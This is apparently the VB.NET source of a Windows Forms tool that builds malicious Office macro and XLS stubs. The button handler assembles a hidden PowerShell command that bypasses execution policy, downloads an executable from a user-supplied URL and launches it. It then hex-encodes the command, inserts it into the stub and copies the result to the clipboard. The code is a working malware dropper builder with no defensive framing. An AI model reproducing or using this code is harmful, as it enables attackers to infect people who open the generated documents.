Imports System.Text
Imports System.Threading
Imports System.Security.Cryptography
Public Class Form1
    Dim savefile As String

#Region "RANDOMSTRING"
    Dim T As New Random
    Function RandomString() As String
        Dim eng As String = "asdsCDEFGHIJKLMNOPQRSTUVWXYZFugncdefghijklmnopqrstuvwxyz"
        Dim heb As String = "אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת"
        Dim arb As String = "ابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي"
        Dim mix As String = "FugnCDEFGHIJKLMNOPQRSTUVWXYZFugncdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת"
        Dim s As String
        s = eng
        Dim sb As New StringBuilder
        For i As Integer = 1 To 11
            Dim idx As Integer = T.Next(0, 50)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function

    Public Function RandomGenerator()
        Randomize()
        Dim a = Int((10 - 1) * Rnd()) + 1
        Return a
    End Function
    Public Function Generator()
        Randomize()
        Dim a = Int((50 - 10) * Rnd()) + 10
        Return a
    End Function
#End Region
#Region "RANDOM"
    Public Class Randomization
        Public Class RandomPassword
            Private Shared DEFAULT_MIN_PASSWORD_LENGTH As Integer = 8
            Private Shared DEFAULT_MAX_PASSWORD_LENGTH As Integer = 10
            Private Shared PASSWORD_CHARS_LCASE As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh"
            Private Shared PASSWORD_CHARS_UCASE As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh"
            Public Shared Function Generate() As String
                Generate = Generate(DEFAULT_MIN_PASSWORD_LENGTH,
                                    DEFAULT_MAX_PASSWORD_LENGTH)
            End Function
            Public Shared Function Generate(ByVal length As Integer) As String
                Generate = Generate(length, length)
            End Function
            Public Shared Function Generate(ByVal minLength As Integer,
                                    ByVal maxLength As Integer) _
              As String
                If (minLength <= 0 Or maxLength <= 0 Or minLength > maxLength) Then
                    Generate = Nothing
                End If
                Dim charGroups As Char()() = New Char()() _
                {
                    PASSWORD_CHARS_LCASE.ToCharArray(), PASSWORD_CHARS_UCASE.ToCharArray(), PASSWORD_CHARS_UCASE.ToCharArray()}
                Dim charsLeftInGroup As Integer() = New Integer(charGroups.Length - 1) {}
                Dim I As Integer
                For I = 0 To charsLeftInGroup.Length - 1
                    charsLeftInGroup(I) = charGroups(I).Length
                Next
                Dim leftGroupsOrder As Integer() = New Integer(charGroups.Length - 1) {}
                For I = 0 To leftGroupsOrder.Length - 1
                    leftGroupsOrder(I) = I
                Next
                Dim randomBytes As Byte() = New Byte(3) {}
                Dim rng As RNGCryptoServiceProvider = New RNGCryptoServiceProvider()
                rng.GetBytes(randomBytes)
                Dim seed As Integer = ((randomBytes(0) And &H7F) << 24 Or
                                        randomBytes(1) << 16 Or
                                        randomBytes(2) << 8 Or
                                        randomBytes(3))
                Dim random As Random = New Random(seed)
                Dim password As Char() = Nothing
                If (minLength < maxLength) Then
                    password = New Char(random.Next(minLength - 1, maxLength)) {}
                Else
                    password = New Char(minLength - 1) {}
                End If
                Dim nextCharIdx As Integer
                Dim nextGroupIdx As Integer
                Dim nextLeftGroupsOrderIdx As Integer
                Dim lastCharIdx As Integer
                Dim lastLeftGroupsOrderIdx As Integer = leftGroupsOrder.Length - 1
                For I = 0 To password.Length - 1
                    If (lastLeftGroupsOrderIdx = 0) Then
                        nextLeftGroupsOrderIdx = 0
                    Else
                        nextLeftGroupsOrderIdx = random.Next(0, lastLeftGroupsOrderIdx)
                    End If
                    nextGroupIdx = leftGroupsOrder(nextLeftGroupsOrderIdx)
                    lastCharIdx = charsLeftInGroup(nextGroupIdx) - 1
                    If (lastCharIdx = 0) Then
                        nextCharIdx = 0
                    Else
                        nextCharIdx = random.Next(0, lastCharIdx + 1)
                    End If
                    password(I) = charGroups(nextGroupIdx)(nextCharIdx)
                    If (lastCharIdx = 0) Then
                        charsLeftInGroup(nextGroupIdx) =
                                        charGroups(nextGroupIdx).Length
                    Else
                        If (lastCharIdx <> nextCharIdx) Then
                            Dim temp As Char = charGroups(nextGroupIdx)(lastCharIdx)
                            charGroups(nextGroupIdx)(lastCharIdx) =
                                        charGroups(nextGroupIdx)(nextCharIdx)
                            charGroups(nextGroupIdx)(nextCharIdx) = temp
                        End If

                        charsLeftInGroup(nextGroupIdx) =
                                   charsLeftInGroup(nextGroupIdx) - 1
                    End If
                    If (lastLeftGroupsOrderIdx = 0) Then
                        lastLeftGroupsOrderIdx = leftGroupsOrder.Length - 1
                    Else
                        If (lastLeftGroupsOrderIdx <> nextLeftGroupsOrderIdx) Then
                            Dim temp As Integer =
                                        leftGroupsOrder(lastLeftGroupsOrderIdx)
                            leftGroupsOrder(lastLeftGroupsOrderIdx) =
                                        leftGroupsOrder(nextLeftGroupsOrderIdx)
                            leftGroupsOrder(nextLeftGroupsOrderIdx) = temp
                        End If
                        lastLeftGroupsOrderIdx = lastLeftGroupsOrderIdx - 1
                    End If
                Next
                Generate = New String(password)
            End Function
        End Class
    End Class
#End Region
    Private Sub GunaButton1_Click(sender As Object, e As EventArgs) Handles GunaButton1.Click





        Dim stub As String = My.Resources.macro_done
        Dim xls As String = My.Resources.xls_stub


        Thread.Sleep(4000)


        If GunaCheckBox4.Checked = True Then

            Dim macro As String = "powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('%link%','%filename%.exe');Start-Process '%filename%.exe'"

            macro = macro.Replace("%link%", GunaTextBox1.Text)

            macro = macro.Replace("%filename%", GunaTextBox3.Text)

            stub = stub.Replace("%done%", encodeer(macro))

            savefile = stub
            System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" + GunaTextBox2.Text + ".txt", savefile)

        End If


        If GunaCheckBox3.Checked = True Then

            Dim macro As String = "powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('%link%','%filename%.exe');Start-Process '%filename%.exe'"

            macro = macro.Replace("%link%", GunaTextBox1.Text)

            macro = macro.Replace("%filename%", GunaTextBox3.Text)

            xls = xls.Replace("%done%", encodeer(macro))

            savefile = xls
            System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" + GunaTextBox2.Text + ".txt", savefile)

        End If


        Clipboard.SetText(savefile)


        MsgBox("Your File Has Been Successfully Created!")
    End Sub
    Private Function encodeer(Source As String) As String
        Dim b As Byte() = System.Text.Encoding.UTF8.GetBytes(Source)
        Return BitConverter.ToString(b).Replace("-", "")
    End Function

    Private Sub GunaButton2_Click(sender As Object, e As EventArgs) Handles GunaButton2.Click
        GunaTextBox2.Text = Randomization.RandomPassword.Generate(6, 6)
    End Sub

    Private Sub GunaButton3_Click(sender As Object, e As EventArgs) Handles GunaButton3.Click
        GunaTextBox3.Text = Randomization.RandomPassword.Generate(6, 6)
    End Sub

    Private Sub GunaCheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles GunaCheckBox1.CheckedChanged

    End Sub
    Private Sub GunaCheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles GunaCheckBox2.CheckedChanged

    End Sub
End Class
